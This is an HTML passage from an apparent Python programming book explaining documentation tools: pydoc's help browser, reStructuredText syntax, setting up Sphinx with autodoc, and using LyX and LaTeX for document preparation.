<li>An alternative way to access the help files is by using the command <kbd>python -m pydoc -g</kbd>, which opens up a generic-looking window to launch the browser window or to search it directly, shown as follows (you will need to have the <kbd>python-tk</kbd> package installed for this to run):</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img src="images/67dec03a-c990-4934-a29f-43284875e116.png" style="width:16.92em;height:7.00em;"/></div>
<ol start="6">
<li>If you enter information in the search bar, you will get a little information, but not much, shown as follows:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img src="images/ab7087ce-97de-4383-807e-4e1ee5e6da4f.png" style="width:28.00em;height:14.92em;"/></div>
<ol start="7">
<li>In this case, if we go to <kbd>multiprocessing.pool</kbd><span>, as in step 3 earlier, we can see that the information is presented in a similar web page; obviously, however, the information is different, because this is Python 2.7, whereas the previous example was Python</span> 3.6.5:</li>
</ol>
<div style="color: black;font-size: 1em" class="CDPAlignCenter CDPAlign"><img src="images/2dc4bc3c-d8e1-4789-8422-bb7755ba7dc6.png"/></div>
<p style="padding-left: 60px">The preceding screenshot shows the same information as in step 3 above, but the formatting is different because it is for Python 2.7.</p>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Using reStructuredText files</h1>
                </header>
            
            <article>
                
<p>Plain text, by definition, is limited in what information it can provide; that is, there is no metadata inherent in a text file (apart from what is provided by the filesystem). In other words, there is no way to bold, italicize, or otherwise augment raw text, to provide some sort of contextual information.</p>
<p>A number of markup languages have been developed over the years, with HTML being a prime example this. However, HTML is a little heavy for in-code documentation purposes. Something more like Wikitext (<a href="https://en.wikipedia.org/wiki/Help:Wikitext">https://en.wikipedia.org/wiki/Help:Wikitext</a>) would make more sense, as it uses simple ASCII characters to provide context to raw text. Hence, PEP 287 proposes the&#160;<strong>reStructuredText</strong> (<strong>reST</strong>) markup be used for structured text documentation within Python docstrings, PEPs, and other documents that require structured markup. Of course, plain text docstrings are not deprecated; reST simply provides more options, for developers who want to be more expressive in their documentation<a href="https://en.wikipedia.org/wiki/Help:Wikitext">.</a></p>
<p>The official location for reST documentation can be found at <a href="http://docutils.sourceforge.net/rst.html">http://docutils.sourceforge.net/rst.html</a>.</p>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Getting ready</h1>
                </header>
            
            <article>
                
<p>If you want to work with reST on its own, you can install the Docutils program (<a href="http://docutils.sourceforge.net/index.html">http://docutils.sourceforge.net/index.html)</a>. <a href="http://docutils.sourceforge.net/index.html">This tool allows you to convert reST into HTML, LaTeX, man pages, XML, or other formats.</a></p>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<ol class="enumerate">
<li>If you just want to include reST in your Python documentation, the following is a quick introduction on how the basic syntax works; at the end&#160;are screenshots of how all of these look in practice (a more thorough demonstration is available at <a href="http://docutils.sourceforge.net/docs/user/rst/demo.html">http://docutils.sourceforge.net/docs/user/rst/demo.html</a>):
<ul>
<li>The paragraph is the most basic pattern in reST. It is simply a block of text separated from other text blocks <span>by a single, blank line</span>. The blocks must have the same indentation, starting at the left edge. Indenting paragraphs results in offset paragraphs, typically used to show quoted text.</li>
<li>Inline markup can be performed by using asterisks, that is, <kbd>*italics*</kbd> and <kbd>**bold**</kbd>. Monospaced, literal text is denoted with double-backticks: <kbd>``*backticks*``</kbd>. Note that any special characters that would normally mark up text are expressed literally, and not interpreted as markup.</li>
<li>To use special characters, reST is semi-intelligent. Using a single asterisk will not cause any markup to occur. To mark-off text with asterisks without it being marked up, use double-backticks, or escape the asterisk by using <kbd>\*</kbd>.</li>
<li>Lists can be created in three ways: enumerated, bulleted, or definitions. Enumerated lists start with either a number or a letter, followed by a <kbd>.</kbd>, <kbd>)</kbd>, or <kbd>()</kbd>; that is, <kbd>1.</kbd>, <kbd>A)</kbd>, and <kbd>(i)</kbd> are all valid.
<p>Bullets are created using either <kbd>*</kbd>, <kbd>+</kbd>, or <kbd>-</kbd>. The symbol that appears depends on the character used. Sub-bullets need two spaces from the original to be recognized.</p>
<p>Definition lists, while classified as lists, are more like special-purpose paragraphs. They consist of a term and, on the following line, an intended definition block.</p>
</li>
<li>Preformatted code samples can be indicated by using <kbd>::</kbd>. The <kbd>::</kbd>&#160;symbol appears on the line prior to the indented code block; think of a quoted paragraph preceded by a line that ends in <kbd>::</kbd>. The preformatting ends when the indentation returns to normal.</li>
<li>Section headers are indicated by using a series of characters directly underneath a line of text. The characters must be of the same length as the text. Each set of characters is assumed to be at the same heading level, so don't just pick characters randomly. Any of the following characters are allowed: <kbd>- _ : ` ~ ' " ^ * + = # &lt; &gt;</kbd>.</li>
<li>The title and subtitle are designated similarly to section headers, except that both the lines above and below the text have a series of characters, rather than just the line below, as in headers.</li>
<li>Images are included by using <kbd>.. image::</kbd>, followed by the image location. The image can be on a local drive or on the internet.</li>
</ul>
</li>
</ol>
<ol start="2">
<li>The following is an example of all of the items discussed earlier, with the raw ST and the output next to it:</li>
</ol>
<div style="color: black;font-size: 1em" class="standard CDPAlignCenter CDPAlign"><img src="images/a8fcb46a-2cd9-4056-8458-63741a392ba6.png" style="width:27.58em;height:49.08em;"/></div>
<p style="padding-left: 60px">The preceding screenshot shows the generic HTML template for the online reST editor.</p>
<ol start="3">
<li>The following screenshot shows how the exact same reST markup can be converted into a completely different look by the parsing engine:</li>
</ol>
<div class="standard CDPAlignCenter CDPAlign"><img src="images/ce830d3b-52f6-419e-b68e-5c960599bd7c.png" style="width:27.42em;height:48.75em;"/></div>
<p style="padding-left: 60px">The preceding screenshot shows an alternate HTML template that can be used with the online reST editor.</p>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Using the Sphinx documentation program</h1>
                </header>
            
            <article>
                
<p>Sphinx was written for Python documentation and is used extensively in official document creation. As a matter of fact, all of the documentation on the Python site is generated by Sphinx. Even the Sphinx website is written in reST and converted to HTML.</p>
<p>Sphinx can convert reST into HTML, PDF, ePub, Texinfo, and man pages. The program is also extensible, for example, via plugins, to generate mathematical notations from formulas or highlight source code.</p>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Getting ready</h1>
                </header>
            
            <article>
                
<p>Download Sphinx via <kbd>pip</kbd> or system installation, such as with&#160;<kbd>apt install</kbd>.</p>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<ol>
<li>Once installed, it is suggested you move to the project directory, as the program defaults to looking for files in the current directory. This is not required, however, as you can always change the configuration later.</li>
<li>Run the following command at the command prompt: <kbd>sphinx-quickstart</kbd>. You will walk through an interactive configuration session, as follows:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img src="images/f27daa9d-5634-4c9f-a44d-41c61753e995.png" style="width:29.83em;height:54.75em;"/></div>
<ol start="3">
<li>The questions are generally self-explanatory, but be sure to check the documentation if something doesn't make sense. Don't panic, however, if you just pick the defaults and don't get the results expected. This process is simply creating the default configuration files, which can be manually modified later.<br/>
A key thing to point out is that, if you want to use your docstrings to generate your documentation, ensure that you select <kbd>autodoc</kbd> for installation.</li>
<li>In your directory, you should now see some new files, specifically <kbd>conf.py</kbd> and <kbd>index.rst</kbd>. These are used to allow Sphinx to operate:
<ul>
<li><kbd>conf.py</kbd>, naturally enough, is the config file for Sphinx. It is the primary location for setting up Sphinx, and entries made during the quickstart process are stored here.</li>
<li><kbd>index.rst</kbd> is the primary file for telling Sphinx how to create the final documentation. It basically tells Sphinx which modules, classes, and so on, to include in the documentation.</li>
</ul>
</li>
<li><span>By default,</span> <kbd>conf.py</kbd> <span>looks for files in</span>&#160;<kbd>PYTHONPATH</kbd><span>; if you are looking to use files in another location, make sure that you set it up correctly, at the top of the file. Specifically, remove the comments from</span> <kbd>import os</kbd><span>,</span> <kbd>import sys</kbd><span>, and the</span> <kbd>sys.path.insert()</kbd> <span>line (and update the path as needed), as follows:</span></li>
</ol>
<div style="color: black;font-size: 1em" class="CDPAlignCenter CDPAlign"><img src="images/96eda21f-a2a7-49d8-982d-b81180bafa42.png" style="width:27.83em;height:27.00em;"/></div>
<p style="padding-left: 60px"><span>As this example has Sphinx running in the same directory as the module, there was no need to change the path.</span></p>
<ol start="6">
<li>If you set up <kbd>conf.py</kbd> to use <kbd>autodoc</kbd>, the next step is relatively easy. Go to <kbd>index.rst</kbd> and tell Sphinx to automatically find the information for the documentation. The easiest way to do this is to take a look at <a href="http://www.sphinx-doc.org/en/stable/ext/autodoc.html#module-sphinx.ext.autodoc">http://www.sphinx-doc.org/en/stable/ext/autodoc.html#module-sphinx.ext.autodoc</a>, which explains how to automatically import all desired modules and retrieve the docstrings from them. The following is a screenshot of the entries made for this example; specifically, the <kbd>automodule</kbd> and sub-entries were added. Everything else is at its default value:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img src="images/78c2613d-3c7b-4423-b617-2b070dd7a514.png" style="width:32.83em;height:31.83em;"/></div>
<ul>
<li>
<ul>
<li>The&#160;<kbd>automodule</kbd>&#160;object (and the module name) tells Sphinx the name of the Python module to import. As a reminder, the module name is simply the Python filename, without the <kbd>.py</kbd> extension.</li>
<li>The&#160;<kbd>members</kbd>&#160;object automatically gathers documentation for all public classes, methods, and functions that have docstrings. If you don't use it, only the docstring for the main object (a module, in this case) will be imported.</li>
<li>The&#160;<kbd>undoc-members</kbd>&#160;object does the same thing, except it will get objects that don't have docstrings. Obviously, the information for these items will be limited, as compared to a docstring.</li>
<li>The&#160;<kbd>show-inheritance</kbd>&#160;object specifies that the inheritance tree for the module will be included. Needless to say, if you aren't using inheritance, this won't do much good.</li>
</ul>
</li>
</ul>
<ol start="7">
<li>Once you have the configuration and index files set, you can run the command <kbd>make html</kbd>, to generate the HTML files for your project. You may run into errors, as follows:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img src="images/e78e2d57-254e-49f0-9f13-e2417511f4d2.png" style="width:29.00em;height:33.42em;"/></div>
<p style="padding-left: 60px">These errors actually mean that the source code doesn't have the spacing requirements expected by reST. The following screenshot is part of the code used in this example:</p>
<div class="CDPAlignCenter CDPAlign"><img src="images/3aca498a-650c-4a74-ae92-3630b5111ca5.png" style="width:36.33em;height:35.25em;"/></div>
<p style="padding-left: 60px">Specifically, a blank line is required between each grouping within the docstring; that is, the <kbd>param</kbd> entries are separate from <kbd>except</kbd>, which is separated from <kbd>return</kbd><em>.</em> When the HTML command was run, the blank lines between these items were not present.</p>
<ol start="8">
<li>When you finally correct all of the problems, you should get a successful make, as follows:</li>
</ol>
<div style="color: black;font-size: 1em" class="CDPAlignCenter CDPAlign"><img src="images/0e0a578b-d4b9-4761-a2d7-a506a4a0a1ab.png" style="width:48.75em;height:29.50em;"/></div>
<ol start="9">
<li>Now, you can go into the target directory and look for <kbd>index.html</kbd> in the <kbd>_build/html</kbd> directory (assuming that you used the default values).</li>
</ol>
<p>&#160;</p>
<ol start="10">
<li>When you open it, you should see something like this:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img src="images/bebb963d-7149-43ff-bd1f-9337e5bc3fcf.png" style="width:57.42em;height:56.08em;"/></div>
<ol start="11">
<li>If you don't like the default theme, there are a number of other themes included with Sphinx. Obviously, given that it is HTML, you can make your own, as well. Here is the included theme,&#160;<em>scrolls</em>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img src="images/17933854-5138-488a-96e0-cb4cf371a278.png" style="width:57.25em;height:55.92em;"/></div>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Using LaTeX and LyX document preparation programs</h1>
                </header>
            
            <article>
                
<p>When preparing external documentation (not docstrings or other in-code documentation), most people resort to Microsoft Word or another word processor, though nowadays HTML is a viable option, as well.</p>
<p>This final section will discuss an alternative to word processors. Word processors are <strong>WYSIWYG</strong>, which stands for <strong>What You See Is What You Get</strong>; in other words, what you see on the screen is essentially what you'll see in the finished product.</p>
<p>One alternative that we will discuss here is document processors. While they tend to look similar to word processors, document processors emphasize the layout of the document's components, rather than formatting text. In other words, document processors are <strong>WYSIWYM&#160;</strong>(<strong>What You See Is What You Mean</strong>). With these programs, what is seen on the screen is not representative of how the final product will look.</p>
<p>LyX (pronounced <em>licks</em>) is one of the more popular document processors. It acts as a graphical frontend to the LaTeX typesetting system, and can be used for documents ranging from books and notes to letters and academic papers.</p>
<p>LyX allows the user to state what type of component a particular part of the paper is; for example, a chapter, heading, paragraph, and so on. Then, the backend software handles formatting it. This enables the user to simply write the document and not worry about how the document will look.</p>
<p>LyX relies on LaTeX (pronounced <em>lateck</em>, as the X is actually the Greek letter Chi), which is a typesetting and document preparation system. When using LaTeX directly, the user writes a document in plain text, using markup tags to identify what different parts should be in the final document.</p>
<p>LaTeX is widely used in Academia, as it has support for mathematical equations, creates print-ready documents, supports multiple languages, and doesn't have the memory problems a word processor has, meaning that a user is less likely to have a system crash when writing large documents with graphics.</p>
<div class="packt_infobox">LyX and LaTeX are properly written in camelCase, as the <em>T</em> and <em>X</em> are actually Greek letters: <em>T = tau</em> and <em>X = chi</em>.</div>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Getting ready</h1>
                </header>
            
            <article>
                
<p>To use LyX, you can download the binary installer from the LyX website ( <a href="https://www.lyx.org/Download">https://www.lyx.org/Download</a>) or use a Linux package manager to download it; for example,&#160;<kbd>apt install lyx</kbd>.</p>
<p>You can install LaTeX separately, but it is recommended to just install LyX, as LaTeX is included with it, and you gain access to a LaTeX GUI, as well.</p>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<ol>
<li>When you first open LyX, you are presented with a window very similar to a word processor, as follows:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img src="images/6725fa83-91f5-47a3-ac20-9de99ff81b57.png"/></div>
<ol start="2">
<li>It is highly recommended you take a look at the documents under the <span class="packt_screen">Help</span> menu, particularly the <span class="packt_screen">Introduction</span> and <span class="packt_screen">Tutorial</span>. Doing so will only take a few hours, at most, but they explains the majority of the basic features of LyX.</li>
</ol>
<p>&#160;</p>
<ol start="3">
<li>Of special note is the drop-down box in the top-left corner, labeled <span class="packt_screen">Standard</span> in the screenshot. This is the <span class="packt_screen">Environment</span> interface for determining what a text component is. The following options are available through this menu:
<ul>
<li><kbd>Standard</kbd>: Normal paragraph.</li>
<li><kbd>LyX-Code</kbd>: LyX-specific commands.</li>
<li><kbd>Quotation</kbd>: Always indents the first line of a paragraph, and uses the same line spacing throughout.</li>
<li><kbd>Quote</kbd>: Uses extra spacing to separate paragraphs, and never indents the first line.</li>
<li><kbd>Verse</kbd>: Used for poetry or songwriting.</li>
<li><kbd>Verbatim</kbd>: Preformatted, monospace text.</li>
<li><kbd>Separator</kbd>: Allows for splitting lists.</li>
<li><kbd>Labeling</kbd>: Assigns a definition to a word.</li>
<li><kbd>Itemize</kbd>: Bulleted list.</li>
<li><kbd>Enumerate</kbd>: Sequential list.</li>
<li><kbd>Description</kbd>: Similar to Labeling, but with a different format.</li>
<li><kbd>Part/Part*</kbd>: Equivalent to a chapter. For this, and the following items, <kbd>&lt;name&gt;*</kbd> indicates&#160;that no number is included; otherwise, the number of the item is included by default.</li>
<li><kbd>Section/Section*</kbd>: Section within a chapter.</li>
<li><kbd>Subsection/Subsection*</kbd>: Part of a section.</li>
<li><kbd>Subsubsection/Subsubsection*</kbd>: Part of a subsection.</li>
<li><kbd>Paragraph/Paragraph*</kbd>: Bolds a paragraph.</li>
<li><kbd>Subparagraph/Subparagraph*</kbd>: Indented version of Paragraph.</li>
<li><kbd>Title/Author/Date</kbd>: Self-explanatory.</li>
<li><kbd>Address/Right Address</kbd>: Primarily used for letters; the only difference is the justification of the address.</li>
<li><kbd>Abstract</kbd>: Executive-style summary of the document.</li>
<li><kbd>Bibliography</kbd>: Manually creates a reference section.</li>
</ul>
</li>
<li>In addition to these, LyX provides for the auto-creation of a table of contents, index, and bibliography. It can also handle text wrapping around graphics, the captioning of graphics, programming code, tables, floating text boxes, colorizing text, rotated text, and so on.</li>
</ol>
<p>&#160;</p>
<ol start="5">
<li>The following is a screenshot of the LyX Tutorial section, as written within the editor:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img src="images/f2f3cd24-6304-43f3-acf2-37b202255c4e.png" style="width:65.83em;height:52.83em;"/></div>
<ol start="6">
<li>Here is the same section, when converted to a PDF:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img src="images/5c307ed9-aa57-47cb-8e30-03b0615703ae.png" style="width:36.33em;height:50.33em;"/></div>
<ol start="7">
<li>Here is the same section in raw LaTeX markup:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img src="images/d4d51b3b-6747-4645-a586-fc397c2ec695.png" style="width:42.25em;height:39.00em;"/></div>
<ol start="8">
<li>As a final example, more relevant to programmers, here is a screenshot of this author's first book, <em>Learning to Program Using Python</em>, which was written entirely in LyX:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img src="images/13501f74-2d4c-4e5a-965b-92d1338ce079.png" style="width:52.92em;height:42.42em;"/></div>
<ol start="9">
<li>The following is that same section in a PDF:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img src="images/6a885e0f-e053-4217-8b2e-930162f49270.png" style="width:57.58em;height:52.92em;"/></div>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">There's more...</h1>
                </header>
            
            <article>
                
<p>Like many Unix-oriented tools, LaTeX can be difficult to work with, especially when it comes to troubleshooting. LyX itself is fairly straightforward, as it is essentially just a graphical wrapper around LaTeX. Therefore, if problems are going to develop, it will be within the underlying TeX environment.</p>
<p>Problems will occur when attempting to generate PDF files or otherwise export your LyX file to another file format. Frequently, these issues can be resolved by installing additional software, which can sometimes be identified within the error message.</p>
<p>For example, during the creation of this book, this author had a problem creating a PDF copy of the <span class="packt_screen">Tutorial</span>, because an error kept occurring when converting the EPS images to PDF images. This was ultimately resolved by using <kbd>apt-cache search epstopdf</kbd>, as determined by the error message. This revealed that the required tool is located in <kbd>texlive-font-utils</kbd>, which would not have been immediately apparent. Fortunately, after installation, the PDF export worked.</p>
<p>All of this discussion is to emphasize that, while LyX and LaTeX are extremely powerful and useful tools, it takes a significant commitment to use them. A basic installation may not provide the tools necessary for your project. However, if you make that commitment, it can be a very useful environment not only for code documentation, but also for the creation of any document. There are even a number of Python tools listed in PyPI that can interact with the core TeX language.</p>


            </article>

            
        </section>
    </div>
</body>
</html>